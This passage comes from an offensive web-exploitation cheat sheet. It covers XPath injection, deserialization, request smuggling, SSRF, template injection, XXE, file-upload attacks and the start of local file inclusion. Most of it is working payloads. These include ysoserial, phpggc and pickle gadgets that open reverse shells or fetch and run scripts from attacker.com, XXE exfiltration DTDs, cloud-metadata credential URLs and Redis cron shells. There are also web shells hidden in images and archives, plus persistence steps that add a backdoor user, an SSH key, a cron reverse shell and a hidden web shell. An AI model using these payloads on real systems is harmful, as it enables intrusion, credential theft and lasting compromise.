' and substring(//user[1]/password,1,1)='a' and '1'='1
' and string-length(//user[1]/password)=8 and '1'='1

# Blind extraction via substring
' and substring(//user[1]/password,1,1)='a' and '1'='1  # True/False
```

**XPath Injection for Data Extraction**

```xpath
# Extract all users
'] | //user | a['a'='a

# Extract specific attributes
'] | //user/username | a['a'='a
'] | //user/password | a['a'='a

# Boolean-based enumeration
' and //user[1]/username='admin' and '1'='1
' and starts-with(//user[1]/password,'a') and '1'='1
```

## Deserialization Vulnerabilities

### PHP Object Injection

**Basic PHP Serialization**

```php
// Serialization
$obj = new User("admin", "password");
$serialized = serialize($obj);
// Output: O:4:"User":2:{s:4:"name";s:5:"admin";s:8:"password";s:8:"password";}

// Unserialization (vulnerable)
$obj = unserialize($_GET['data']);
```

**PHP Deserialization Payloads**

```php
// Magic methods exploitation
__wakeup()
__destruct()
__toString()

// Example payload
O:8:"EvilUser":1:{s:7:"command";s:6:"whoami";}

// File read payload
O:8:"FileRead":1:{s:4:"file";s:15:"/etc/passwd";}
```

**PHP Gadget Chains**

```bash
# PHPGGC tool for gadget generation
phpggc -l  # List available gadgets
phpggc Symfony/RCE4 system 'whoami'
phpggc Laravel/RCE1 system id
phpggc Monolog/RCE1 system 'nc -e /bin/bash attacker.com 4444'

# Encode payload
phpggc Symfony/RCE4 system 'whoami' -b  # Base64
phpggc Symfony/RCE4 system 'whoami' -u  # URL-encode
phpggc Symfony/RCE4 system 'whoami' -j  # JSON
```

**PHP Object Injection via Phar**

```php
// Phar deserialization
file_exists('phar://exploit.phar');
file_get_contents('phar://exploit.phar');
include('phar://exploit.phar');

// Generate malicious phar
<?php
class Exploit {
    public $cmd = 'system';
    public $arg = 'whoami';
}
$phar = new Phar('exploit.phar');
$phar->startBuffering();
$phar->setStub('<?php __HALT_COMPILER(); ?>');
$phar->setMetadata(new Exploit());
$phar->addFromString('test.txt', 'test');
$phar->stopBuffering();
?>
```

### Java Deserialization

**Identifying Java Deserialization**

```bash
# Java serialization magic bytes
AC ED 00 05  # Start of serialized Java object
rO0AB  # Base64 encoded serialized object

# Common vulnerable libraries
commons-collections
commons-fileupload
groovy
spring-core
```

**ysoserial for Java Exploitation**

```bash
# List available payloads
java -jar ysoserial.jar

# Generate payload
java -jar ysoserial.jar CommonsCollections1 'whoami'
java -jar ysoserial.jar CommonsCollections5 'bash -c {echo,BASE64}|{base64,-d}|{bash,-i}'

# Common payload types
java -jar ysoserial.jar CommonsCollections1 'nc -e /bin/bash attacker.com 4444'
java -jar ysoserial.jar CommonsCollections6 'wget http://attacker.com/shell.sh -O /tmp/shell.sh && bash /tmp/shell.sh'
java -jar ysoserial.jar Groovy1 'curl http://attacker.com/$(whoami)'

# Encode for transmission
java -jar ysoserial.jar CommonsCollections1 'whoami' | base64
java -jar ysoserial.jar CommonsCollections1 'whoami' | xxd -p | tr -d '\n'
```

**Java Deserialization Testing**

```bash
# Burp Collaborator interaction
java -jar ysoserial.jar CommonsCollections1 'nslookup $(whoami).burpcollaborator.net'

# Time-based detection
java -jar ysoserial.jar CommonsCollections1 'sleep 10'
java -jar ysoserial.jar CommonsCollections1 'ping -c 10 127.0.0.1'

# HTTP callback
java -jar ysoserial.jar CommonsCollections1 'curl http://attacker.com/callback'
```

**JexBoss Tool (JBoss Exploitation)**

```bash
# Scan for vulnerabilities
python jexboss.py -u http://target.com

# Auto-exploit
python jexboss.py -u http://target.com -auto-exploit

# Specific module
python jexboss.py -u http://target.com -M jmx-console
```

### Python Pickle Deserialization

**Basic Pickle Exploitation**

```python
import pickle
import os

class Exploit:
    def __reduce__(self):
        return (os.system, ('whoami',))

payload = pickle.dumps(Exploit())
print(payload)

# Vulnerable code
import pickle
data = pickle.loads(payload)  # Executes command
```

**Pickle RCE Payloads**

```python
# Reverse shell
import pickle
import os

class ReverseShell:
    def __reduce__(self):
        cmd = "bash -c 'bash -i >& /dev/tcp/<IP>/<PORT> 0>&1'"
        return (os.system, (cmd,))

payload = pickle.dumps(ReverseShell())

# Alternative using subprocess
import subprocess

class Exploit:
    def __reduce__(self):
        return (subprocess.Popen, (['/bin/bash', '-c', 'bash -i >& /dev/tcp/<IP>/<PORT> 0>&1'],))
```

**Pickle Opcode Injection**

```python
# Raw pickle opcodes
import pickletools

payload = b"""cos
system
(S'whoami'
tR."""

pickletools.dis(payload)
```

### .NET Deserialization

**ysoserial.net Usage**

```bash
# List available gadgets
ysoserial.exe -l

# Generate payload
ysoserial.exe -g ObjectDataProvider -f Json -c "calc.exe"
ysoserial.exe -g TypeConfuseDelegate -f BinaryFormatter -c "powershell -enc BASE64"

# Common gadgets
ysoserial.exe -g ObjectDataProvider -f Json -c "cmd /c whoami"
ysoserial.exe -g PSObject -f BinaryFormatter -c "net user hacker Pass123! /add"
```

**ViewState Exploitation**

```bash
# Decode ViewState
echo "<viewstate>" | base64 -d | xxd

# Generate malicious ViewState
ysoserial.exe -p ViewState -g TextFormattingRunProperties -c "powershell -enc BASE64" --path="/page.aspx" --apppath="/" --decryptionalg="AES" --decryptionkey="<key>" --validationalg="HMACSHA256" --validationkey="<key>"

# ViewState without MAC validation
ysoserial.exe -p ViewState -g TypeConfuseDelegate -c "calc.exe" --islegacy --isencrypted
```

### Node.js Deserialization

**node-serialize Exploitation**

```javascript
// Vulnerable code
var serialize = require('node-serialize');
var payload = serialize.unserialize(user_input);

// Exploit payload
{"rce":"_$$ND_FUNC$$_function(){require('child_process').exec('whoami', function(error, stdout, stderr){console.log(stdout)});}()"}

// Reverse shell
{"rce":"_$$ND_FUNC$$_function(){require('child_process').exec('bash -c \"bash -i >& /dev/tcp/<IP>/<PORT> 0>&1\"', function(error, stdout, stderr){console.log(stdout)});}()"}
```

**funcster Exploitation**

```javascript
// Payload format
{"__js_function":"function(){return require('child_process').execSync('whoami').toString()}"}
```

### Testing for Deserialization Vulnerabilities

**Detection Methods**

```bash
# 1. Identify serialized data format
AC ED 00 05        # Java
rO0AB             # Java Base64
O:4:"User"        # PHP
{"__type":        # .NET JSON
_$$ND_FUNC$$_     # Node.js

# 2. Test for callback
# Use Burp Collaborator or custom listener
nslookup $(whoami).burpcollaborator.net
curl http://attacker.com/$(whoami)

# 3. Time-based detection
sleep 10
ping -c 10
```

## Deserialization Vulnerabilities (Continued)

### Ruby Deserialization

**Marshal/YAML Exploitation**

```ruby
# Marshal deserialization (binary format)
# Vulnerable code
data = Marshal.load(user_input)

# Exploit using universal deserializer gadget
# Ruby 2.x Universal RCE gadget
payload = "\x04\x08o:\x1bGem::Requirement[\x06o:\x1aGem::DependencyList[\x06o:\x15Gem::Package::TarReader"
```

**YAML Deserialization**

```ruby
# Vulnerable code
require 'yaml'
YAML.load(user_input)

# Exploit payload
--- !ruby/object:Gem::Installer
i: x
--- !ruby/object:Gem::SpecFetcher
i: y

# Command execution payload
--- !ruby/object:Gem::Requirement
requirements:
  !ruby/object:Gem::DependencyList
  specs:
  - !ruby/object:Gem::Source
    current_user_dir: /tmp
  - !ruby/object:Gem::Package::TarReader
    io: &1 !ruby/object:Net::BufferedIO
      io: &1 !ruby/object:Gem::Package::TarReader::Entry
         read: 0
         header: "abc"
      debug_output: &1 !ruby/object:Net::WriteAdapter
         socket: &1 !ruby/object:Gem::RequestSet
             sets: !ruby/object:Net::WriteAdapter
                 socket: !ruby/module 'Kernel'
                 method_id: :system
             git_set: "bash -c 'bash -i >& /dev/tcp/<IP>/<PORT> 0>&1'"
         method_id: :resolve
```

**YAML.safe_load Bypass Attempts**

```ruby
# Test for unsafe classes allowed
--- !ruby/object:Gem::Installer
--- !ruby/object:Gem::Requirement
--- !ruby/hash:ExploitClass

# Symbol DoS (Denial of Service)
--- !ruby/symbol :testing_symbol
```

### Testing Methodology for Deserialization

**Step 1: Identify Serialization Format**

```bash
# Check HTTP headers
Content-Type: application/x-java-serialized-object
Content-Type: application/x-php-serialized
X-Java-Serialized-Object: true

# Examine cookies
JSESSIONID with AC ED 00 05 prefix
PHPSESSIDwith serialized PHP format

# Check parameters
base64 -d <<< "rO0AB..." | xxd | head
echo "O:4:..." # PHP format visible
```

**Step 2: Fingerprint Libraries/Framework**

```bash
# Java: Look for stack traces or error messages
commons-collections version
Spring Framework version
Apache Commons version

# .NET: Check error messages
System.Runtime.Serialization
Newtonsoft.Json
BinaryFormatter

# Python: Check imports
pickle
PyYAML
jsonpickle

# PHP: Check phpinfo or errors
serialize() / unserialize()
__wakeup, __destruct in error messages
```

**Step 3: Generate Test Payload**

```bash
# Non-destructive callback test
# Java
java -jar ysoserial.jar CommonsCollections1 'nslookup $(whoami).attacker.com'

# PHP
phpggc Monolog/RCE1 system 'nslookup test.attacker.com'

# Python
import pickle, os
class Test:
    def __reduce__(self):
        return (os.system, ('nslookup test.attacker.com',))
pickle.dumps(Test())
```

**Step 4: Confirm Execution**

```bash
# Monitor DNS queries
tcpdump -i any udp port 53
python -m dnslib.server --log

# HTTP callback listener
python3 -m http.server 80
nc -lvnp 80
```

**Step 5: Escalate to Shell**

```bash
# After confirming RCE, deploy reverse shell
# Encode to avoid bad characters
echo 'bash -i >& /dev/tcp/<IP>/<PORT> 0>&1' | base64
# Use in payload with base64 -d | bash
```

### Advanced Deserialization Techniques

**Gadget Chain Construction**

```bash
# [Inference] Understanding gadget chains:
# 1. Entry point: Magic method or auto-invoked function
# 2. Chain links: Methods calling other methods
# 3. Sink: Dangerous function (eval, system, exec)

# Example Java gadget chain flow:
# readObject() -> transform() -> invoke() -> Runtime.exec()
```

**Polymorphic Gadgets**

```bash
# Multiple exploitation paths in same application
java -jar ysoserial.jar CommonsCollections1 'cmd'
java -jar ysoserial.jar CommonsCollections2 'cmd'
java -jar ysoserial.jar CommonsCollections5 'cmd'
java -jar ysoserial.jar CommonsCollections6 'cmd'

# Try different payload types if one fails
```

**Bypass Serialization Filters**

```bash
# Java: Look-ahead deserialization filters (JEP 290)
# [Inference] Possible bypass approaches:
# - Use allowed classes in unexpected ways
# - Exploit filter implementation bugs
# - Use gadgets from allowed libraries

# Test with innocuous classes first
java -jar ysoserial.jar CommonsBeanutils1 'cmd'  # Often whitelisted
```

**Compression/Encoding Chains**

```bash
# GZip compressed serialized object
gzip payload.ser
base64 payload.ser.gz

# Nested encoding
base64(gzip(serialize(payload)))

# Hex encoding
xxd -p payload.ser | tr -d '\n'
```

## Cross-Protocol Exploitation

### HTTP Request Smuggling for RCE

**CL.TE (Content-Length vs Transfer-Encoding) Smuggling**

```http
POST / HTTP/1.1
Host: vulnerable.com
Content-Length: 6
Transfer-Encoding: chunked

0

G
```

**TE.CL Smuggling**

```http
POST / HTTP/1.1
Host: vulnerable.com
Content-Length: 4
Transfer-Encoding: chunked

5c
GPOST / HTTP/1.1
Content-Type: application/x-www-form-urlencoded
Content-Length: 15

x=1
0


```

**Exploitation for Code Execution**

```http
# Smuggle request to internal admin endpoint
POST / HTTP/1.1
Host: vulnerable.com
Content-Length: 200
Transfer-Encoding: chunked

0

POST /admin/exec HTTP/1.1
Host: internal-admin.local
Content-Type: application/x-www-form-urlencoded
Content-Length: 15

cmd=whoami
```

### Server-Side Request Forgery (SSRF) to RCE

**Cloud Metadata Exploitation**

```bash
# AWS metadata
http://169.254.169.254/latest/meta-data/
http://169.254.169.254/latest/meta-data/iam/security-credentials/
http://169.254.169.254/latest/user-data/

# Google Cloud
http://metadata.google.internal/computeMetadata/v1/
http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token

# Azure
http://169.254.169.254/metadata/instance?api-version=2021-02-01
http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/

# DigitalOcean
http://169.254.169.254/metadata/v1/
http://169.254.169.254/metadata/v1/user-data
```

**Internal Service Exploitation**

```bash
# Redis exploitation
# URL encode CRLF for protocol smuggling
http://vulnerable.com/fetch?url=http://localhost:6379/%0D%0A*1%0D%0A$8%0D%0Aflushall%0D%0A*3%0D%0A$3%0D%0Aset%0D%0A$1%0D%0A1%0D%0A$64%0D%0A%0A%0A*/1 * * * * bash -i >& /dev/tcp/<IP>/<PORT> 0>&1%0A%0A%0A%0D%0A*4%0D%0A$6%0D%0Aconfig%0D%0A$3%0D%0Aset%0D%0A$3%0D%0Adir%0D%0A$16%0D%0A/var/spool/cron/%0D%0A*4%0D%0A$6%0D%0Aconfig%0D%0A$3%0D%0Aset%0D%0A$10%0D%0Adbfilename%0D%0A$4%0D%0Aroot%0D%0A*1%0D%0A$4%0D%0Asave%0D%0A

# Memcached exploitation
gopher://localhost:11211/_%0d%0aset%20exploit%200%200%20100%0d%0a<?php system($_GET['cmd']); ?>%0d%0a

# FastCGI exploitation
gopher://localhost:9000/...fastcgi_payload...

# SMTP exploitation for command execution
http://vulnerable.com/fetch?url=smtp://localhost:25/%0AHELO%20test%0AMAIL%20FROM:attacker@evil.com%0ARCPT%20TO:root@localhost%0ADATA%0ASubject:exploit%0A%0A*/1 * * * * bash -c 'bash -i >& /dev/tcp/<IP>/<PORT> 0>&1'%0A.%0AQUIT
```

**SSRF with Protocol Wrappers**

```bash
# File protocol
file:///etc/passwd
file:///proc/self/environ
file:///var/www/html/config.php

# PHP wrappers (if processing as PHP)
php://filter/convert.base64-encode/resource=/etc/passwd
php://input  # POST data
data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7Pz4=

# Expect wrapper (if enabled)
expect://whoami

# Gopher for multi-protocol
gopher://localhost:25/_MAIL%20FROM...
```

**SSRF Bypass Techniques**

```bash
# Localhost bypass
http://127.0.0.1
http://0.0.0.0
http://localhost
http://[::1]
http://127.1
http://0177.0.0.1  # Octal
http://0x7f.0x0.0x0.0x1  # Hex
http://2130706433  # Decimal
http://127.0.0.1.nip.io
http://spoofed.burpcollaborator.net  # DNS rebinding

# DNS rebinding
# Point domain to public IP first, then change to 127.0.0.1

# URL parser confusion
http://attacker.com@127.0.0.1
http://127.0.0.1#@attacker.com
http://attacker.com#127.0.0.1

# CRLF injection
http://attacker.com%0d%0aSet-Cookie:%20admin=true

# Unicode/encoding bypass
http://â‘ â‘¡â‘¦.â“ª.â“ª.â‘   # Unicode numbers
http://127.0.0ã€‚1  # Alternate dot characters
```

### Template Injection to RCE

**Server-Side Template Injection (SSTI) Detection**

```bash
# Polyglot payload for detection
${{<%[%'"}}%\.

# Math operations
{{7*7}}
${7*7}
<%= 7*7 %>
${{7*7}}
#{7*7}
*{7*7}
```

**Jinja2 (Python) SSTI**

```python
# Basic RCE
{{config.__class__.__init__.__globals__['os'].popen('whoami').read()}}

# Alternative methods
{{''.__class__.__mro__[1].__subclasses__()[396]('whoami',shell=True,stdout=-1).communicate()}}

# File read
{{''.__class__.__mro__[1].__subclasses__()[40]('/etc/passwd').read()}}

# Reverse shell
{{config.__class__.__init__.__globals__['os'].popen('bash -c "bash -i >& /dev/tcp/<IP>/<PORT> 0>&1"').read()}}

# Bypass filters
{{request.application.__globals__.__builtins__.__import__('os').popen('whoami').read()}}
{{lipsum.__globals__.os.popen('whoami').read()}}
{{cycler.__init__.__globals__.os.popen('whoami').read()}}
```

**Twig (PHP) SSTI**

```php
# Basic RCE
{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("whoami")}}

# Alternative
{{_self.env.registerUndefinedFilterCallback("system")}}{{_self.env.getFilter("id")}}

# File read
{{'/etc/passwd'|file_excerpt(1,30)}}

# Reverse shell
{{_self.env.registerUndefinedFilterCallback("system")}}{{_self.env.getFilter("bash -c 'bash -i >& /dev/tcp/<IP>/<PORT> 0>&1'")}}
```

**FreeMarker (Java) SSTI**

```java
# RCE via execute
<#assign ex="freemarker.template.utility.Execute"?new()> ${ ex("whoami") }

# ObjectConstructor
<#assign value="freemarker.template.utility.ObjectConstructor"?new()>${value("java.lang.ProcessBuilder","whoami").start()}

# API built-in
${"freemarker.template.utility.Execute"?new()("whoami")}
```

**Velocity (Java) SSTI**

```java
# Basic RCE
#set($str=$class.inspect("java.lang.String").type)
#set($chr=$class.inspect("java.lang.Character").type)
#set($ex=$class.inspect("java.lang.Runtime").type.getRuntime().exec("whoami"))

# Alternative
#set($s="")
$s.class.forName("java.lang.Runtime").getRuntime().exec("whoami")
```

**ERB (Ruby) SSTI**

```ruby
# Basic RCE
<%= system("whoami") %>
<%= `whoami` %>
<%= IO.popen("whoami").readlines() %>

# Reverse shell
<%= system("bash -c 'bash -i >& /dev/tcp/<IP>/<PORT> 0>&1'") %>

# File read
<%= File.open('/etc/passwd').read %>
```

**Smarty (PHP) SSTI**

```php
# RCE via {php} tags (if enabled)
{php}system("whoami");{/php}

# Static method call
{Smarty_Internal_Write_File::writeFile($SCRIPT_NAME,"<?php system('whoami'); ?>",self::clearConfig())}

# Function call
{system('whoami')}
```

**Thymeleaf (Java) SSTI**

```java
# Expression objects
${T(java.lang.Runtime).getRuntime().exec('whoami')}

# Spring expression
__${new java.util.Scanner(T(java.lang.Runtime).getRuntime().exec("whoami").getInputStream()).next()}__::.x

# Request parameter
__${T(java.lang.Runtime).getRuntime().exec(param.cmd)}__::.x
```

**Pug/Jade (Node.js) SSTI**

```javascript
# Basic RCE
#{function(){localLoad=global.process.mainModule.constructor._load;sh=localLoad("child_process").exec('whoami')}()}

# Alternative
#{global.process.mainModule.require('child_process').execSync('whoami')}

# Reverse shell
#{global.process.mainModule.require('child_process').exec('bash -c "bash -i >& /dev/tcp/<IP>/<PORT> 0>&1"')}
```

**Tornado (Python) SSTI**

```python
# Handler access
{% import os %}{{os.system('whoami')}}

# Alternative
{{''.__class__.__mro__[1].__subclasses__()[396]('whoami',shell=True,stdout=-1).communicate()}}
```

### Testing Workflow for SSTI

**1. Identify Template Engine**

```bash
# Trigger errors to reveal engine
{{7*'7'}}  # Jinja2: 7777777, Twig: 49
${7*'7'}   # Different behavior per engine

# Check error messages
TemplateSyntaxError  # Jinja2/Django
Twig_Error           # Twig
FreeMarker error     # FreeMarker
```

**2. Map Available Objects**

```python
# Jinja2 example
{{config}}
{{request}}
{{lipsum}}
{{cycler}}
{{joiner}}
{{namespace}}
```

**3. Find Path to Dangerous Functions**

```python
# Enumerate subclasses
{{''.__class__.__mro__}}
{{''.__class__.__mro__[1].__subclasses__()}}

# Find useful classes
{% for x in ''.__class__.__mro__[1].__subclasses__() %}
  {% if "Popen" in x.__name__ %}
    {{loop.index0}}
  {% endif %}
{% endfor %}
```

**4. Construct RCE Payload**

```python
# Use discovered index
{{''.__class__.__mro__[1].__subclasses__()[INDEX]('whoami',shell=True,stdout=-1).communicate()}}
```

**5. Establish Reverse Shell**

```python
# Final payload
{{config.__class__.__init__.__globals__['os'].popen('bash -c "bash -i >& /dev/tcp/<IP>/<PORT> 0>&1"').read()}}
```

## XML External Entity (XXE) Injection to RCE

### Basic XXE Detection

**Out-of-Band XXE**

```xml
<?xml version="1.0"?>
<!DOCTYPE foo [
<!ENTITY xxe SYSTEM "http://attacker.com/xxe">
]>
<data>&xxe;</data>
```

**File Disclosure XXE**

```xml
<?xml version="1.0"?>
<!DOCTYPE foo [
<!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<data>&xxe;</data>
```

**Blind XXE with Parameter Entities**

```xml
<?xml version="1.0"?>
<!DOCTYPE foo [
<!ENTITY % xxe SYSTEM "http://attacker.com/xxe.dtd">
%xxe;
]>
```

**External DTD for Data Exfiltration**

```xml
# On attacker server (xxe.dtd):
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://attacker.com/?data=%file;'>">
%eval;
%exfil;

# Trigger from victim:
<!DOCTYPE foo [
<!ENTITY % xxe SYSTEM "http://attacker.com/xxe.dtd">
%xxe;
]>
```

### XXE to Remote Code Execution

**PHP expect:// Wrapper**

```xml
<?xml version="1.0"?>
<!DOCTYPE foo [
<!ENTITY xxe SYSTEM "expect://whoami">
]>
<data>&xxe;</data>

# Reverse shell
<!ENTITY xxe SYSTEM "expect://bash -c 'bash -i >& /dev/tcp/<IP>/<PORT> 0>&1'">
```

**Java XXE to RCE via jar: Protocol**

```xml
# Upload malicious JAR, then:
<!DOCTYPE foo [
<!ENTITY xxe SYSTEM "jar:http://attacker.com/evil.jar!/Evil.class">
]>
```

**XXE with File Upload**

```xml
# 1. Upload PHP shell via XXE
<!DOCTYPE foo [
<!ENTITY xxe SYSTEM "php://filter/convert.base64-decode/resource=/var/www/html/shell.php">
]>
<data>BASE64_ENCODED_PHP_SHELL</data>

# 2. Access uploaded shell
curl http://target.com/shell.php?cmd=whoami
```

**SSRF via XXE to Internal Services**

```xml
# Access internal admin panel
<!ENTITY xxe SYSTEM "http://localhost/admin/exec?cmd=whoami">

# Redis exploitation
<!ENTITY xxe SYSTEM "http://localhost:6379/%0D%0A*1%0D%0A$8%0D%0Aflushall%0D%0A*3%0D%0A$3%0D%0Aset%0D%0A$1%0D%0A1%0D%0A$64%0D%0A%0A%0A*/1 * * * * bash -i >& /dev/tcp/<IP>/<PORT> 0>&1%0A%0A%0A">
```

### XXE in Different Contexts

**SOAP Web Services**

```xml
<soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
<!DOCTYPE foo [
<!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<soap:Body>
  <data>&xxe;</data>
</soap:Body>
</soap:Envelope>
```

**SVG File Upload**

```xml
<?xml version="1.0" standalone="yes"?>
<!DOCTYPE test [
<!ENTITY xxe SYSTEM "file:///etc/hostname">
]>
<svg width="128px" height="128px" xmlns="http://www.w3.org/2000/svg">
  <text font-size="16" x="0" y="16">&xxe;</text>
</svg>
```

**DOCX/XLSX File Upload**

```bash
# Unzip Office document
unzip document.docx -d extracted

# Edit extracted/word/document.xml
<!DOCTYPE foo [
<!ENTITY xxe SYSTEM "http://attacker.com/callback">
]>

# Rezip
cd extracted
zip -r ../malicious.docx *
```

**RSS/Atom Feeds**

```xml
<?xml version="1.0"?>
<!DOCTYPE rss [
<!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<rss version="2.0">
  <channel>
    <title>Test</title>
    <description>&xxe;</description>
  </channel>
</rss>
```

## Post-Exploitation Considerations

**Maintain Access After Initial RCE**

```bash
# Add SSH key
mkdir -p ~/.ssh
echo "ssh-rsa AAAA..." >> ~/.ssh/authorized_keys
chmod 600 ~/.ssh/authorized_keys

# Create backdoor user
useradd -m -s /bin/bash backdoor
echo 'backdoor:password' | chpasswd
usermod -aG sudo backdoor

# Cron persistence
echo '*/5 * * * * bash -i >& /dev/tcp/<IP>/<PORT> 0>&1' | crontab -

# Web shell backdoor
echo '<?php system($_GET["c"]); ?>' > /var/www/html/.config.php
```

**Privilege Escalation After RCE**

```bash
# Run automated enumeration
wget http://attacker.com/linpeas.sh
bash linpeas.sh

# Check for quick wins
sudo -l
find / -perm -4000 -type f 2>/dev/null
cat /etc/crontab
```

## Important Subtopics

**Web Application Firewall (WAF) Bypass Techniques** - encoding, chunking, and evasion methods for bypassing filtering **API Security Testing** - REST/GraphQL injection and exploitation patterns **WebSocket Exploitation** - injection and hijacking in real-time protocols **Container Escape Techniques** - exploitation leading to host system access from containerized applications

---

## File Upload Vulnerabilities

File upload vulnerabilities enable arbitrary code execution, data exfiltration, or system compromise when applications lack proper validation, storage isolation, or execution prevention mechanisms.

**Upload Point Identification**

Discover file upload functionality during reconnaissance:

```bash
nmap -sV --script http-enum <target>
nmap -sV --script http-form-brute <target>
burp suite (manual inspection of forms)
```

Identify upload forms through manual browsing, directory enumeration, or application spidering. Common upload endpoints:

- `/upload`, `/file-upload`, `/media/upload`
- `/user/avatar`, `/profile/picture`
- `/document/submit`, `/resume/upload`
- `/import`, `/batch-process`
- API endpoints: `/api/upload`, `/api/files`, `/api/media`

Examine HTML source for hidden upload fields:

```html
<input type="file" name="uploadfile" accept=".pdf,.doc" />
```

Analyze form attributes (enctype, method, action) and JavaScript validation for bypass opportunities.

**MIME Type Validation Bypass**

Applications frequently validate file types through MIME type checking, which is client-controllable and server-bypassable.

Modify Content-Type header in HTTP requests:

```
POST /upload HTTP/1.1
Host: target.local
Content-Type: multipart/form-data; boundary=----FormBoundary

------FormBoundary
Content-Disposition: form-data; name="file"; filename="shell.php"
Content-Type: image/jpeg

<?php system($_GET['cmd']); ?>
------FormBoundary--
```

Tools for automated bypasses:

```bash
burp repeater (manual Content-Type modification)
curl -F "file=@shell.php;type=image/jpeg" http://target/upload.php
```

Craft polyglot files containing valid file signatures combined with executable code:

```bash
# Create JPEG with embedded PHP
printf '\xFF\xD8\xFF\xE0' > shell.jpg  # JPEG header
echo '<?php system($_GET["cmd"]); ?>' >> shell.jpg
```

[Inference] File type validation bypasses rely on server-side verification not properly checking file contents beyond MIME type headers, though robust implementations verify file magic bytes and internal structure regardless of client-provided MIME information.

**File Extension Filtering Bypass**

Extensions-based filtering can be circumvented through alternative executable extensions or case manipulation.

Common bypass techniques:

```
shell.php â†’ shell.php5, shell.php7, shell.phtml, shell.pht, shell.shtml
shell.jsp â†’ shell.jspx, shell.war
shell.asp â†’ shell.aspx, shell.cer, shell.asa
shell.exe â†’ shell.com, shell.scr, shell.bat, shell.cmd, shell.ps1
```

Case sensitivity exploitation (filesystem-dependent):

```
shell.pHp (Windows, case-insensitive filesystems)
shell.PHP (lowercase filters)
```

Double extension attacks (web server configuration-dependent):

```
shell.php.jpg (Apache with AddType php .jpg configuration)
shell.jpg.php (vulnerable configurations treating rightmost extension)
```

Null byte injection (deprecated in modern PHP):

```
shell.php%00.jpg (interpreted as shell.php in PHP < 5.3)
```

[Unverified] Null byte injection is patched in modern PHP versions though remains [Inference] exploitable in legacy applications where disabled PHP strict mode or older web server configurations may process the null byte incorrectly.

**Archive-Based Upload Exploitation**

Applications processing uploaded archives (ZIP, TAR, RAR) may extract contents without proper path sanitization.

Create malicious archives with path traversal:

```bash
mkdir exploit
echo '<?php system($_GET["cmd"]); ?>' > exploit/shell.php
cd exploit
zip -r ../malicious.zip .
# Alternatively, manual archive manipulation
unzip -l malicious.zip
# Output: exploit/shell.php

# Create archive with traversal path
mkdir -p "../../var/www/html"
echo '<?php system($_GET["cmd"]); ?>' > "../../var/www/html/shell.php"
zip -r traversal.zip .
```

[Inference] Path traversal in archive extraction enables arbitrary file placement outside intended upload directories when extraction routines don't validate member paths against directory traversal sequences, though modern libraries (ZipArchive, Python zipfile) default-restrict extraction to base directories.

**Image File Upload with Embedded Code**

Image upload restrictions can be bypassed by embedding executable code within valid image files.

Append PHP to valid image:

```bash
cat image.jpg shell.php > combined.jpg
```

Use specialized tools for polyglot generation:

```bash
exiftool -Comment='<?php system($_GET["cmd"]); ?>' image.jpg
identify combined.jpg  # Verify image validity
```

Exploit image processing libraries:

```bash
# ImageMagick ImageTragick (CVE-2016-3714)
convert 'https://example.com/image.jpg[0]|whoami' output.jpg
```

[Unverified] Image processing library vulnerabilities like ImageTragick enable command injection through specially crafted image files processed by vulnerable ImageMagick versions, though exploitation depends on specific library version and processing operations applied.

**Upload Location and Execution Analysis**

Determine upload destination and execution context:

```bash
# After uploading test file
find /var/www -name "test_uploaded_file.txt" -mmin -5
ls -la /var/www/uploads/
cat /var/www/uploads/test_uploaded_file.txt
```

Analyze web server configuration for upload directory:

```bash
cat /etc/apache2/sites-available/default
cat /etc/nginx/sites-available/default
```

[Inference] Uploaded files stored in web-accessible directories with executable permissions enable direct code execution through HTTP requests, while uploads outside web root or in directories without execute permissions require alternative exploitation (local file inclusion, application processing).

**Race Condition Exploitation**

Upload files rapidly before server-side validation or deletion:

```bash
#!/bin/bash
for i in {1..1000}; do
    curl -F "file=@shell.php" http://target/upload.php &
done
wait
```

[Unverified] Upload race conditions exist in applications validating files after writing to disk, creating a window where unvalidated files are temporarily accessible before deletion or quarantine, though exploitation window is typically microseconds to milliseconds making practical exploitation difficult.

**Zip Slip and Archive Traversal**

Craft malicious ZIP files exploiting extraction path traversal:

```bash
# Create nested structure
mkdir -p "../../../tmp/web"
echo '<?php system($_GET["cmd"]); ?>' > "../../../tmp/web/shell.php"
# Using zipme or manual creation
python3 << 'EOF'
import zipfile
z = zipfile.ZipFile('malicious.zip', 'w')
z.writestr('../../var/www/html/shell.php', '<?php system($_GET["cmd"]); ?>')
z.close()
EOF
```

[Inference] Zip Slip exploits occur when archive extraction routines fail to validate or sanitize member paths containing `../` sequences, enabling arbitrary file placement outside the intended extraction directory, though modern implementations validate member paths and refuse extraction when traversal sequences are detected.

**Upload Filename Manipulation**

Applications may process filenames without proper sanitization:

```
filename: shell.php??.jpg (processed as shell.php in some contexts)
filename: shell.php....jpg (trailing dots removed on Windows)
filename: shell.php%20 (trailing space removed)
filename: shell.php::$DATA (NTFS alternate data stream, Windows-specific)
```

Command injection through filenames:

```
filename: shell.php;id.jpg
filename: shell.php`whoami`.jpg
filename: shell.php$(id).jpg
```

[Unverified] Filename-based exploitation depends on specific backend processingâ€”scripting language interpretation, shell command invocation, or file system interactionsâ€”making exploitation highly context-dependent.

**Upload Functionality Fuzzing**

Systematically test upload restrictions:

```bash
wfuzz -c -z file,wordlist.txt -z range,1-100 -X POST -b "COOKIE" -d "file=FUZZ" http://target/upload.php
# Or manual testing with various payloads
for ext in php php3 php4 php5 php7 phtml shtml; do
    echo "<?php system(\$_GET['cmd']); ?>" > "shell.$ext"
    curl -F "file=@shell.$ext" http://target/upload.php
done
```

---

## Local File Inclusion (LFI)

Local File Inclusion vulnerabilities enable arbitrary file disclosure, information gathering, and code execution when applications dynamically include files based on user input without proper validation.

**LFI Vulnerability Identification**

Identify inclusion points through parameter analysis:

```bash
# URL parameter testing
http://target/page.php?file=about
http://target/page.php?page=home
http://target/view.php?document=report
http://target/index.php?lang=en
http://target/content.php?section=news
```

Burp Suite parameter discovery:

```
- Crawl application recording all parameters
